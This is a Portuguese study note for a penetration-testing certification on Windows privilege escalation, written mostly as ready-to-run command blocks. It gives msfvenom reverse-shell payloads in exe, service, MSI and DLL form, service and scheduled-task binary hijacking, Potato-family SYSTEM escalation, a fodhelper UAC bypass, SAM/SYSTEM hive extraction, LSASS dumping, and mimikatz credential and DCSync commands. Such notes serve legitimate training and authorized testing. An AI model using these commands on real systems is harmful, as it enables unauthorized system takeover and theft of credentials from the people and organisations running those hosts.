---
tema: Privilege Escalation
tópico: Windows Privilege Escalation — situação, vetores de serviço e credenciais
tags: [htb, cpts, privesc, windows, seimpersonate, uac, mimikatz, winpeas]
dificuldade: medium
---

# 🪟 CPTS 26 - Windows Privilege Escalation

> [!info] Objetivo
> Sair de um shell de usuário comum (ou de serviço mal configurado) para **Administrator/SYSTEM** em Windows. No Windows a escalada quase nunca é um CVE de kernel: é **permissão errada em serviço**, **privilégio habilitado** (SeImpersonate/SeBackup) ou **credencial em texto claro**. Enumerar com `whoami /priv` e `winPEAS` resolve 80% dos casos.

---

## 🎯 Quando usar

Use quando já tem execução de código/comando no host (shell reverso, `winrm`, RCE web).

| Situação | Vetor mais provável |
|----------|---------------------|
| Shell como `iis apppool\`, `mssql$`, `NETWORK SERVICE` | **SeImpersonate** → PrintSpoofer/GodPotato |
| Usuário de serviço criado por admin | **Permissões de serviço** → `binPath` editável |
| Serviços com path sem aspas | **Unquoted service path** |
| Você é Administrador mas não "elevado" | **UAC bypass** |
| Host com histórico de admin logado | **Credenciais** (cmdkey, runas, unattend, LSASS) |
| Tempo limitado / engajamento real | **winPEAS + wesng** primeiro |

> [!tip] Regra de ouro
> Antes de qualquer coisa: **`whoami /priv`**. Se aparecer `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`, pare tudo e vá para o Potato family. É a escalada mais rápida e confiável do Windows.

---

## 🧰 Ferramentas

| Ferramenta | Tipo | Como rodar | Para quê |
|-----------|------|-----------|----------|
| **winPEAS.exe / .bat** | 🔵 | `.\winPEASx64.exe quiet` | Enumeração completa (cores + log) |
| **PrivescCheck** | 🔵 PS | `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"` | Achados com risco explicado |
| **PowerUp.ps1** | 🔵 PS | `. .\PowerUp.ps1; Invoke-AllChecks` | Serviços/registro/paths vulneráveis |
| **Seatbelt** | 🔵 | `Seatbelt.exe -group=all` | Auditoria de config do host |
| **SharpUp** | 🔵 | `SharpUp.exe audit` | PowerUp em C# (não precisa de PS) |
| **wesng (wes.py)** | 🟢 local | `wes.py systeminfo.txt -i 'Elevation of Privilege'` | CVEs faltantes a partir do `systeminfo` |
| **Sherlock / Watson** | 🔵 PS | `Find-AllVulns` | Kernel/missing patch → privesc |
| **accesschk.exe** | 🔵 Sysinternals | `accesschk.exe -uwcqv "Users" *` | Permissões de serviços/chaves |
| **Procmon.exe** | 🔵 Sysinternals | filtro `Result = NAME NOT FOUND` | Descobrir DLL hijacking |
| **mimikatz.exe** | 🔵 | `privilege::debug` + `sekurlsa::logonpasswords` | Credenciais em memória |
| **PrintSpoofer / GodPotato / JuicyPotato** | 🔵 | ver seção SeImpersonate | Elevar de serviço para SYSTEM |
| **secretsdump.py** | 🐧 local | `secretsdump.py -sam sam.hiv -system system.hiv local` | Extrair hashes de SAM/SYSTEM |

---

## 🧭 Situação do host (enumeração manual primeiro)

```powershell
# 🪟 Identidade, grupos e PRIVILÉGIOS (o comando mais importante da nota)
whoami
whoami /priv
whoami /groups
whoami /all                     # tudo de uma vez
echo %USERNAME%                 # cmd
$env:USERNAME                   # powershell

# 🪟 Host, patch level e arquitetura (base para wesng e kernel exploits)
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
Get-ComputerInfo
Get-HotFix                      # patches instalados → o que FALTA é o exploit
wmic qfe get HotFixID,InstalledOn

# 🪟 Usuários locais, grupos e quem é admin
net user
net user <USUARIO>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

# 🪟 Rede, sessões e serviços (quem está logado, para onde dá para pivotar)
ipconfig /all
route print
netstat -ano
net session                     # sessões SMB atuais
net share
qwinsta                         # sessões RDP abertas (usuário logado = credencial em memória)

# 🪟 Processos e serviços com seus contextos
tasklist /v
tasklist /svc
Get-Process | Select-Object Name,Id,Path
sc query type= service state= all
```

> [!tip] Gargalo de sessão
> `whoami /priv` só mostra privilégios **do token atual**. Se você entrou via serviço (IIS, MSSQL), está em um token de serviço — as permissões disponíveis são diferentes das de um login interativo.

---

## 🔧 Serviços e permissões (vetor nº1 depois do SeImpersonate)

### Serviço com permissão de alteração

```powershell
# 🪟 1) Listar serviços e procurar os que o meu usuário pode ALTERAR
sc query state= all
sc qc <NOME_SVC>                                     # binpath, start name, tipo
accesschk.exe -uwcqv "Users" *                       # permissões de todos os serviços
accesschk.exe -uwcqv "<USUARIO>" *
# Procurar SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS na saída.

# 🪟 2) Ver permissão via PowerShell quando não há accesschk
Get-Acl HKLM:\System\CurrentControlSet\Services\<NOME_SVC>
Get-Service <NOME_SVC> | Select-Object -ExpandProperty ServiceName

# 🪟 3) Reconfigurar o binário do serviço para o NOSSO payload
#    ⚠️ atenções: binPath= precisa de ESPAÇO depois do "=" e o path deve ir entre aspas
sc config <NOME_SVC> binPath= "C:\temp\shell.exe"
sc stop <NOME_SVC>
sc start <NOME_SVC>

# 🪟 Alternativa: trocar só o executável (quando o arquivo do serviço é gravável)
icacls "C:\Program Files\App\service.exe"
copy /Y C:\temp\shell.exe "C:\Program Files\App\service.exe"
```

```bash
# 🐧 Gerar o payload antes de tudo (ver CPTS 08 - Shells and Payloads)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORTA> -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORTA> -f exe-service -o svc.exe
```

### Unquoted service path

```powershell
# 🪟 Serviços cujo ImagePath não está entre aspas e contém ESPAÇOS são sequestrables:
#    C:\Program Files\My App\service.exe
#    O Windows tenta, em ordem:
#      C:\Program.exe
#      C:\Program Files\My.exe
#      C:\Program Files\My App\service.exe

wmic service get name,displayname,pathname,startmode | findstr /i "auto"
wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
Get-CimInstance Win32_Service | Where-Object {$_.PathName -notlike '"*'} | Select Name,PathName,StartMode

# 🪟 Se eu puder escrever num dos diretórios intermediários, planto o payload com
#    o nome exato que falta e reinicio o serviço:
copy C:\temp\shell.exe "C:\Program Files\My.exe"
sc stop <NOME_SVC>; sc start <NOME_SVC>
# Sem permissão de restart → esperar reboot ou o serviço reiniciar sozinho.
```

### icacls: descobrir o que eu posso escrever

```powershell
# 🪟 O comando que revela o vetor: onde o meu usuário tem (F)ull, (M)odify ou (W)rite
icacls "C:\Program Files\App"
icacls "C:\ProgramData"
icacls "C:\" | findstr /i "Users"
# (F) Full · (M) Modify · (W) Write · (RX) Read+Execute
# Procurar por: Users:(F), Users:(M), Authenticated Users, Everyone

# 🪟 Conceder/alterar permissão (quando você já é admin e quer plantar algo)
icacls "C:\temp\shell.exe" /grant <USUARIO>:F
takeown /f "C:\path\file" /r /d y
icacls "C:\path\file" /grant <USUARIO>:F
```

---

## 🧨 Vetores de escalada Windows

### 1. SeImpersonate / SeAssignPrimaryToken — Potato family

```powershell
# 🪟 PRESENTE QUANDO: whoami /priv mostra SeImpersonatePrivilege
#    Contextos típicos: IIS APPPOOL\*, MSSQL$, NETWORK SERVICE, serviços internet.

# PrintSpoofer — Windows 10 / Server 2016-2019 (usa named pipe do Spooler)
.\PrintSpoofer64.exe -i -c "cmd /c whoami"
.\PrintSpoofer64.exe -c "C:\temp\shell.exe"

# GodPotato — funciona de 2012 a 2022/11, inclusive Server 2022
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato — até Server 2016/Win10 1809 (precisa de um CLSID válido para o OS)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *
# Em 2019+ o CLSID padrão falha → usar JuicyPotatoNG ou GodPotato.

# SweetPotato / RoguePotato / EfsPotato — variantes para quando o Spooler está desligado
.\SweetPotato.exe -p C:\temp\shell.exe
.\EfsPotato.exe "cmd /c whoami"

# 🐧 Listener obrigatório em todos os casos (payload conecta de volta)
nc -lvnp <PORTA>
```

> [!warning] Escolha do Potato depende do OS
> OS antigo (≤2016) → JuicyPotato. Windows 10/Server moderno → PrintSpoofer. Server 2019/2022 com Spooler restrito → GodPotato/JuicyPotatoNG. Testar o errado só gera `Access denied` ou `COM error`.

### 2. Outros privilégios de token úteis

| Privilégio | Exploração |
|-----------|-----------|
| `SeImpersonatePrivilege` | Potato family → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | idem (JuicyPotato/GodPotato) |
| `SeBackupPrivilege` | copiar `SAM`/`SYSTEM`/`NTDS.dit` mesmo sem ACL |
| `SeRestorePrivilege` | escrever em arquivos "protegidos" → substituir binário de serviço |
| `SeTakeOwnershipPrivilege` | `takeown` + `icacls` para se tornar dono de qualquer arquivo |
| `SeDebugPrivilege` | dumpar LSASS (`procdump`/`mimikatz`) para pegar credenciais |
| `SeLoadDriverPrivilege` | carregar driver malicioso assinado/vulnerável |
| `SeManageVolumePrivilege` | escrever em `System32` via volume handle |
| `SeTcbPrivilege` | já é equivalente a SYSTEM (raríssimo) |

```powershell
# 🪟 SeBackupPrivilege na prática — dump de SAM/SYSTEM sem ser admin
reg save hklm\sam C:\temp\sam.hiv
reg save hklm\system C:\temp\system.hiv
# 🐧 Exfiltrar e interpretar com impacket fora do alvo
secretsdump.py -sam sam.hiv -system system.hiv LOCAL
```

### 3. AlwaysInstallElevated

```powershell
# 🪟 As DUAS chaves precisam estar em 1. Se estiverem, qualquer usuário instala MSI como SYSTEM.
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 🐧 Gerar o MSI malicioso do atacante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORTA> -f msi -o shell.msi

# 🪟 Instalar: /quiet /qn = sem UI; rode como SYSTEM por causa da policy
msiexec /quiet /qn /i C:\temp\shell.msi
```

### 4. Autoruns e caminhos de inicialização

```powershell
# 🪟 Chaves Run/RunOnce e Startup: se um binário ali é gravável → executa como o
#    dono da sessão (Administrator) no próximo logon/reboot.
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# 🪟 Autoruns.exe (Sysinternals) mostra TUDO de uma vez; filtrar por
#    "Path not found" e "File not found" = alvo de sequestro.
autorunsc.exe -a * -accepteula -nobanner -h -s
```

### 5. Tarefas agendadas

```powershell
# 🪟 Tarefa rodando como SYSTEM/Administrator cujo binário OU diretório é gravável
schtasks /query /fo LIST /v
schtasks /query /tn "<NomeDaTarefa>" /fo LIST /v
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like '*SYSTEM*'} | Select TaskName,TaskPath

# 🟢 Executável de tarefa acessível → substituir por payload (mesmo nome)
icacls "C:\Path\Task\bin.exe"
copy /Y C:\temp\shell.exe "C:\Path\Task\bin.exe"

# 🟢 Trocar a ação da tarefa (se você tiver permissão de escrita na tarefa)
schtasks /change /tn "<NomeDaTarefa>" /tr "C:\temp\shell.exe"
```

### 6. DLL hijacking / DLL planting

```powershell
# 🪟 Um executável/ serviço carrega uma DLL que não encontra → procura no PATH e no
#    diretório do próprio .exe. Se você pode escrever nesse diretório, plantar a DLL.

# 🪟 Descobrir com Procmon: filtro Path ends with .dll AND Result is NAME NOT FOUND
#    Depois de achar o nome, gerar DLL com msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORTA> -f dll -o hijack.dll
# Colocar a DLL no diretório de busca do processo (cwd, exe dir, System32, PATH)
# e reiniciar/aguardar o serviço.

# 🪟 Powershell reflection (sem tocar no disco, quando só precisa rodar código)
#    útil para DLL plant/hijack em ambiente com AV: execute o payload direto em memória.
```

### 7. UAC bypass

```powershell
# 🪟 Você É Administrador, mas o processo roda em token "medium integrity".
#    whoami /groups mostra "Mandatory Label\Medium Mandatory Level".
whoami /groups | findstr /i "Mandatory"

# Técnica fodhelper (Win10): sequestrar a chave que o fodhelper carrega (auto-elevado)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /d "C:\temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# Técnica computerdefaults / eventvwr / sdclt — mesma lógica (ver coleção UACME)
# Alternativa: meterpreter "getsystem" ou, se você já tem sessão, migrar para processo elevado.
```

> [!tip] Como saber se é UAC bypass
> Se `whoami` dá seu usuário e `net localgroup Administrators` te lista, mas o token é médio, **já é admin**. Você só precisa do bypass para ter integridade alta (High Mandatory Level).

### 8. Credenciais, SAM/LSASS e mimikatz

```powershell
# 🪟 1) Coisas que o usuário já guardou
cmdkey /list                                # credenciais salvas (Windows Credential Manager)
runas /savecred /user:<DOMINIO>\<USUARIO> "cmd.exe"   # se houver "cmdkey /list" com credencial
dir C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
type C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 🪟 2) Arquivos de instalação/automação com senha em texto claro
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep\sysprep.inf
dir /s /b C:\*.xml 2>nul | findstr /i "unattend sysprep"

# 🪟 3) Registro — senhas e auto-logon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# 🪟 4) SAM / SYSTEM / SECURITY (hives) → hashes locais
reg save hklm\sam C:\temp\sam.hiv
reg save hklm\system C:\temp\system.hiv
reg save hklm\security C:\temp\security.hiv
# 🐧 Fora do alvo:
secretsdump.py -sam sam.hiv -system system.hiv LOCAL

# 🪟 5) LSASS em memória (mais antigo, sem tocar em disco novo)
#    Requer SeDebugPrivilege ou admin. Alternativas modernas: dump de LSASS + pypykatz.
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
# 🐧 Interpretar com pypykatz (sem Windows):
pypykatz lsa minidump lsass.dmp

# 🪟 6) mimikatz — o canivete suíço de credenciais
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # senhas/hashes/kerberos em memória
mimikatz # lsadump::sam                 # hashes dos usuários locais
mimikatz # lsadump::secrets             # segredos LSA (conta de serviço, auto-logon)
mimikatz # sekurlsa::tickets /export    # tickets Kerberos → pass-the-ticket (ver CPTS 13)
mimikatz # lsadump::dcsync /user:<DOMINIO>\krbtgt   # só para DC (ver CPTS 13)
```

> [!warning] LSASS agora é sonoro
> Desde o Windows 8.1/10 o acesso a `lsass.exe` é protegido (Credential Guard, LSA Protection). Dumpar é barulhento e pode falhar. Prefira credenciais salvas, arquivos de config e DPAPI antes de tocar em LSASS.

### 9. Kernel / patches faltantes (wesng, Sherlock)

```bash
# 🐧 Fora do alvo: transformar o systeminfo em lista de CVEs
wes.py systeminfo.txt                             # relatório completo
wes.py systeminfo.txt -i "Elevation of Privilege" # só privesc
wes.py systeminfo.txt --exploits-only             # só o que tem exploit público
wes.py systeminfo.txt -o csv -f report.csv        # exportar para o relatório
```

```powershell
# 🟪 Sherlock/Watson no host: dá o nome do exploit C# quando o patch falta
powershell -ep bypass -c "Import-Module .\Sherlock.ps1; Find-AllVulns"
# Exemplos clássicos: MS16-032 (secondary logon), MS17-010 (EternalBlue), CVE-2019-1388
```

---

## 🗺️ Tabela achado → exploração

| Achado | Exploração |
|--------|-----------|
| `whoami /priv` → SeImpersonatePrivilege | PrintSpoofer / GodPotato / JuicyPotato |
| SeBackupPrivilege | `reg save hklm\sam` + `system` → secretsdump |
| SeDebugPrivilege | dump de `lsass.exe` + pypykatz/mimikatz |
| SeTakeOwnershipPrivilege | `takeown` + `icacls` → trocar binário de serviço |
| Serviço com `SERVICE_CHANGE_CONFIG` | `sc config <svc> binPath= "C:\temp\shell.exe"` |
| Serviço com path sem aspas | plantar `C:\Program.exe` ou dir intermediário |
| Diretório do serviço com Write/Modify | sobrescrever o `.exe` do serviço |
| AlwaysInstallElevated = 1 (HKLM+HKCU) | `msiexec /quiet /qn /i shell.msi` |
| Tarefa agendada como SYSTEM + binário gravável | substituir o `.exe` da tarefa |
| Chave `Run` com binário gravável | sequestro → executa no logon do admin |
| `cmdkey /list` com credencial salva | `runas /savecred /user:...` |
| `Unattend.xml` / `sysprep.xml` | ler senha em texto claro → `runas`/`psexec` |
| `DefaultPassword` no Winlogon | `runas /user:<USUARIO> cmd.exe` |
| `ConsoleHost_history.txt` | senha digitada em comando → reuso |
| Hives SAM/SYSTEM | `secretsdump` → hashes → pass-the-hash |
| DLL não encontrada (Procmon) | plantar DLL no diretório de busca |
| Administrador + token medium | UAC bypass (fodhelper / UACME) |
| Patch ausente (MS16-032 etc.) | Sherlock/wesng → exploit compilado |

---

## ⚠️ Pegadinhas

- 🕳️ **`binPath=` sem espaço depois do `=` = erro.** Sintaxe `sc` é sensível: `binPath= "C:\x.exe"`.
- 🕳️ **Antivírus come o `shell.exe`.** Renomeie, use `-f exe-service`, ou payload em memória/reflection.
- 🕳️ **Unquoted path exige permissão de escrita no diretório correto.** Se você não pode escrever em `C:\`, o vetor está morto mesmo com o path sem aspas.
- 🕳️ **PrintSpoofer falha no Server 2022** e JuicyPotato falha em 2019+ sem o CLSID certo. Escolha pelo OS.
- 🕳️ **UAC ≠ privesc.** Você já é admin; bypass de UAC não troca de usuário, só eleva integridade.
- 🕳️ **Não reinicie serviços de produção** para "ver se sobe". Espere o ciclo ou use uma cópia.
- 🕳️ **Deslogar/iniciar sessão apaga o dmp e os hives** em `C:\temp` (AppData é volátil). Exfiltre logo.
- 🕳️ **`systeminfo` em host antigo pode mentir** sobre patches; cruze `Get-HotFix` com `wes.py`.
- 🕳️ **Kerberos vs NTLM:** hash de usuário local não dá domínio. Não confunda privesc local com DA.
- 🕳️ **Token de serviço com path em UNC:** o erro `0x80070005` indica problema de permissão no compartilhamento, não no payload.
- 🕳️ **`icacls` mostra (F) para o seu usuário no diretório-pai, mas não no arquivo.** Cheque o arquivo, não só a pasta.

---

## ✅ Checklist rápido

- [ ] Shell estável (evitar que a sessão caia no meio do dump)
- [ ] `whoami /all` e `whoami /priv` lidos e privilégios anotados
- [ ] `systeminfo` → arquivo salvo no atacante para `wes.py`
- [ ] `net user` / `net localgroup Administrators` revisados
- [ ] `winPEAS` e `PowerUp Invoke-AllChecks` executados e saída salva
- [ ] Serviços com permissões frouxas (`accesschk`/`icacls`) identificados
- [ ] Unquoted service paths listados e testada a escrita nos diretórios
- [ ] AlwaysInstallElevated verificado nas **duas** chaves
- [ ] Tarefas agendadas e autoruns revisadas
- [ ] `cmdkey /list`, `ConsoleHost_history.txt` e `Unattend/sysprep` buscados
- [ ] SAM/SYSTEM/SECURITY salvos e processados com secretsdump
- [ ] SeImpersonate presente? Potato adequado ao OS testado
- [ ] Token medium + grupo Administrators? Bypass de UAC aplicado
- [ ] `whoami` final retornando `nt authority\system` / Administrator + evidência capturada

---

## 🔗 Relacionado

- [[Fase 10 - Privilege Escalation]] — checklist da fase e encaixe no engajamento
- [[CPTS 25 - Linux Privilege Escalation]] — o equivalente do outro lado
- [[CPTS 13 - Active Directory Enumeration and Attacks]] — DCSync, tickets e path para Domain Admin
- [[CPTS 11 - Attacking Common Services]] — SMB, WinRM e MSSQL como ponto de entrada
- [[CPTS 09 - Using the Metasploit Framework]] — sessões, `getsystem` e geração de payloads
